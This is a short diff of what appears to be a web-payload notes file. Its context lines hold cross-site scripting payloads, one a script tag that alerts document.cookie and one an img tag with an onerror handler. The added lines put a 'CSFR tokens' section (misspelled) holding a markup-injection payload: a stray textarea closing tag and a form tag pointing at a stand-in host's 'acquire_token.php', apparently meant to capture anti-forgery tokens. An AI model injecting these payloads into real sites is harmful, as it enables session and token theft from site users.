@@ -19,3 +19,7 @@ nu11secur1ty<script>alert(document.cookie)</script>
 ```
 </span><img src=1 onerror=alert(1) /><span>
 ```
+## CSFR tokens
+```
+<form action="https:/yourdomain.com/acquire_token.php"></textarea>
+```
